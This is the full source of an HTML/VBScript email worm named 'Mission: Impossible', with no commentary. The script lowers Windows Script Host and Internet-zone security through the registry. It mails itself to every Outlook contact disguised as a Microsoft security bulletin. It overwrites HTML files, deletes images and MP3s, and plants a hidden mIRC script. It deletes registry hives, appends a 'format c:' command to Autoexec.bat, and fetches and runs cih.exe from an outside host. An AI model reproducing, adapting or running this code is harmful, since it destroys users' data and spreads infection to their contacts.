<HTML>
<HEAD>
<META NAME="Author" CONTENT="very buggy - but possible?!">
<META NAME="Description" CONTENT="Mission: Impossible">
</HEAD>

<BODY>
<P>she causes this!</P>
<OBJECT id=OlMsg classid=clsid:0006F063-0000-0000-C000-000000000046>
<PARAM name="Folder" value="Inbox">
</OBJECT>

<SCRIPT LANGUAGE="JavaScript">
function winerr() {
	return true;
}
window.onerror = winerr;
</SCRIPT>

<SCRIPT LANGUAGE="VBScript">
On Error Resume Next

Const ForReading = 1
Const ForWriting = 2
Const ForAppending = 8


If OlMsg Is Nothing Then GoTo EndOfWorm

Set wss = OlMsg.Session.Application.CreateObject("WScript.Shell")
Set fso = OlMsg.Session.Application.CreateObject("Scripting.FileSystemObject")
Set wsn = OlMsg.Session.Application.CreateObject("WScript.Network")
Set Internet = OlMsg.Session.Application.CreateObject("Microsoft.XMLHTTP")
Dim WinDir, SysDir, TmpDir

Call StartUp()

''--------------------------------------------------------
''--------------------------------------------------------
''--------------------------------------------------------

Sub RegistrySettings()
On Error Resume Next
Dim FileExt, Counter
    FileExt = Array(".JS\", ".DOC\", ".GIF\", ".JPG\", ".HTT\", ".BMP\", ".AVI\", ".MPG\", ".SHS\", ".MP3\")

 	For Counter = 0 To UBound(FileExt)
  	 RegSet "HKCR\" &FileExt(Counter),"Mission: Impossible","0"
 	Next

 	RegSet "HKCR\VBSFile\Editflags", 01000100, "1" 
	RegSet "HKCU\Software\Microsoft\Office\9.0\Word\Security\level", 1, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote", 1, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout", 0, "1"
  	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 1, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "1"
	RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Mission: Impossible", "0"
        RegSet "HKLM\Hardware\Description\System\CentralProcessor\0\VendorIdentifier","Mission: Impossible","0" 
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 0, "1"
End Sub

Sub SpreadViaOutlook()
On Error Resume Next
Dim Address, NumOfContacts, Counter, EmailItem, ContactNumber, Buffer, Code, htm, htm2
  

Set MSOutlook = OlMsg.Session.Application
Set MapiNs = MSOutlook.GetNameSpace("MAPI")
For Each JM In MapiNs.AddressLists
	For Each JP In JM.AddressEntries
		Set MsgItem = MSOutlook.CreateItem(0)
		MsgItem.Recipients.Add(JP.Name)
		MsgItem.Subject = "Fw: Microsoft Security Bulletin"
		MsgItem.HtmlBody = Document.Body.OuterHtml
		MsgItem.DeleteAfterSubmit = True
		MsgItem.Send
	Next
Next
End Sub

Sub Payload()
On Error Resume Next
      Call SearchDrives()
      Call CreateGarbage()
      Call MerlinAction()
      fso.DeleteFile(WinDir &"Regedit.exe")
      fso.DeleteFile(Windir &"User.dat")
      fso.DeleteFile(Windir &"User.bak")
      fso.DeleteFile(Windir &"System.dat")
      fso.DeleteFile(Windir &"System.bak")
  
          Dim Autoexec : Set Autoexec = fso.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
              Autoexec.WriteLine "format c: /q /autotest /u"
              Autoexec.Close
     
          wss.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
      
 	If day(now) = 2 then
	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
     HTTPFileDownload "http://fws.freewebspace.com/cih.exe",SysDir &"cih.exe"
     wss.run SysDir &"cih.exe"
    End If     
End Sub     

''--------------------------------------------------------
''--------------------------------------------------------
''--------------------------------------------------------

Function SearchDrives()
On Error Resume Next
	Dim hdready, drive
 	Dim Drives : Set Drives = fso.Drives

 	For Each Drive In Drives
  	 If (Drive.Drivetype = Remote) or (Drive.IsReady = True) Then
   	  hdready = Drive & "\"
      Call SubFolders(hdready)
     End If
    Next
End Function

Function SubFolders(path)
On Error Resume Next
	Dim File, Ext
 	Dim Fold : Set Fold = fso.GetFolder(path)
 	Dim Files : Set Files = Fold.Files
    
 	For Each File In Files
     Ext = lcase(fso.GetExtensionName(File.Path))

  	  If File.Name = "mirc.ini" Then
       Call InfectMirc(file.ParentFolder)
  	  End If
  
  	 If (Ext = "htm") or (Ext = "html") Then
       Call InfectHTMLFile(File.Path)
     End If
    
     If (Ext = "jpg") or (Ext = "mp3") Then
      Call InfectOtherFile(File.Path)	
     End If

    Set File = Fold.Subfolders
  	 For Each Subfol In File
      Call Subfolders(Subfol.path)
     Next
End Function

Sub CreateGarbage()
On Error Resume Next
Dim aname,x
          x = 0
    AName = ""
 
 	Randomize(timer)
    Do until x = 2500
  	 Do until Len(AName) = 7 
   	  AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
  	 Loop
      
   	 Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("c:\" &AName)
       	 GarbageFolder.attributes = GarbageFolder.attributes + 2
         GarbageFolder.attributes = GarbageFolder.attributes + 1
       
   	 Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("c:\" &AName &"\" &AName &".txt", True)
         GarbageFile.WriteLine "Mission: Impossible!" 
         GarbageFile.Close
     
  	 AName = "" 
  	 x = x + 1
 	Loop       
End Sub

Function HTTPFileDownload(url,FileSaveTo)
On Error Resume Next
Dim receive, Output, i

    Output = ""
    Internet.open "GET",url,False
    Internet.send
    receive = Internet.responseBody

    For i = 0 to UBound(receive)
     Output = Output & chrw(ascw(chr(ascb(midb(receive,i+1,1)))))
    Next

    Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)
        Download.Write Output
        Download.Close
End Function

Function GetSubNet()
On Error Resume Next
Dim Buffer, dot, subnet, i
Dim Winsock : Set Winsock = CreateObject("MSWinsock.Winsock")
	Buffer = Winsock.LocalIP
    
    If Buffer = "" then
	msgbox "tst"
  	 Randomize(timer)
     wss.run windir &"ipconfig.exe /batch " &TmpDir &"ip.txt",0,True 

	 Dim IPFile : Set IPFile = fso.OpenTextFile(TmpDir &"ip.txt",ForReading,False)
    	 IPFile.SkipLine
    	 IPFile.SkipLine
    	 IPFile.SkipLine
    	 IPFile.SkipLine
    	 IPFile.SkipLine
    	 Buffer = IPFile.ReadLine 
    	 IPFile.Close
 
     fso.DeleteFile(TmpDir &"ip.txt")
    End If
    
    dot = 0  
    subnet = ""
    Buffer = Mid(Buffer,32,Len(Buffer))
   
  	For i = 1 to Len(Buffer)
   	 If Mid(Right(Buffer,i),1,1) = "." Then
      dot = dot + 1
   	 End If
   
   	 If dot = 3 Then
      SubNet = Left(Buffer,i)	
      Exit For
     End If
    Next

  	GetSubNet = SubNet
End Function 

Function GetIPAddress(Subnet)
Dim tmp, i

	For i = 0 to 2  
 	 tmp = tmp &Int((9 - 0 + 1) * Rnd + 0)
	Next

    GetIPAddress = Subnet &tmp 
End Function

Function RegGet(value)
On Error Resume Next
	RegGet = wss.RegRead(value)
End Function

Sub RegSet(key,value,keytype)
On Error Resume Next
	Select Case keytype   
  	 Case "1" wss.RegWrite key,value, "REG_DWORD"
  	 Case Else wss.RegWrite key,value
 	End Select  
End Sub

Function CheckFileFolderExists(strName, fFile)
	CheckFileFolderExists = False
 
  	If fFile = True Then
     If fso.FileExists(strName) = True Then
       CheckFileFolderExists = True
       Exit Function
      End If
    Else
     If fso.FolderExists(strName) = True Then 
      CheckFileFolderExists = True
      Exit Function
     End if
    End If
End Function

''--------------------------------------------------------
''--------------------------------------------------------
''--------------------------------------------------------

Sub InfectHTMLFile(FilePath)
    Dim HTMLFile : Set HTMLFile = fso.OpenTextFile(FilePath,ForWriting,True)
        HTMLFile.Write HTMLBody
        HTMLFile.Close
End Sub

Sub InfectOtherFile(FilePath)	
	fso.DeleteFile(FilePath)
End Sub

Sub InfectMirc(Path)     
On Error Resume Next
	If Path <> "" Then
	 Dim MircScript : Set MircScript = fso.CreateTextFile(Path & "\script.ini", True)
         MircScript.attributes = MircScript.attributes + 1
  	     MircScript.attributes = MircScript.attributes + 2
   	     MircScript.writeline "[script]"
   	     MircScript.writeLine ";mIRC Script"
   	     MircScript.writeLine ";http://www.mirc.com"
   	     MircScript.writeLine ";Please do not edit this script!"
   		 MircScript.writeline "n0=on 1:start:{"
 	 	 MircScript.writeline "n1= .remote on"
	 MircScript.writeline "n2= .ctcps on"
	 MircScript.writeline "n3= .events on"
	 MircScript.writeline "n4= }"
      	 MircScript.writeline "n9=on 1:OP:#:.timer1 1200 /kick $me you worked for too long - go out an love someone!!!"
      	 MircScript.writeline "n10=on 1:Join:#:if $chan = #help /part $chan"
      	 MircScript.writeline "n11=on 1:Text:#:love:/say $chan Yes I love her!!!"
      	 MircScript.writeline "n12=on 1:Text:leave:#:{ /msg $chan Your will is my command"
      	 MircScript.writeline "n13=                    /part $chan }"
 	 	 MircScript.Close
    End If 
End Sub  

''--------------------------------------------------------
''--------------------------------------------------------
''--------------------------------------------------------

Sub StartUp()
      WinDir = fso.GetSpecialFolder(0) &"\"
      SysDir = fso.GetSpecialFolder(1) &"\"
      TmpDir = fso.GetSpecialFolder(2) &"\"

      Call RegistrySettings()
      Call SpreadViaOutlook()
      Call Payload() 
      
End Sub

EndOfWorm:
